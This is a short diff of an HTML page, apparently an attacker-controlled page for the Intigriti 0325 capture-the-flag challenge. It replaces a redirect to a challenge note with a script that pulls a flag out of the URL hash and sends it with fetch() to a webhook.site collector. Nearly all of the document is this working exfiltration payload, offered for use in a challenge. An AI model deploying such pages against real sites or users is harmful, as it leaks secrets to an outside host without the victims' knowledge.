@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <meta charset="utf-8">
-    <title>Redirecting...</title>
-    <script>
-        window.location.href = "https://challenge-0325.intigriti.io/note/a16af852-4f8e-4774-9fbe-8ad397cc2b4a";
-    </script>
-</head>
 <body>
-    <p>Redirecting...</p>
+<script>
+  // Se c’è un hash nel formato #:~:username:FLAG
+  if (window.location.hash.startsWith('#:')) {
+    const secret = window.location.hash.slice(2);
+    const flag = secret.split(':')[1];
+    fetch('https://webhook.site/cd7c7ad4-331d-4c16-bf61-ae284ce6e20a?flag='+encodeURIComponent(flag));
+  }
+</script>
 </body>
 </html>
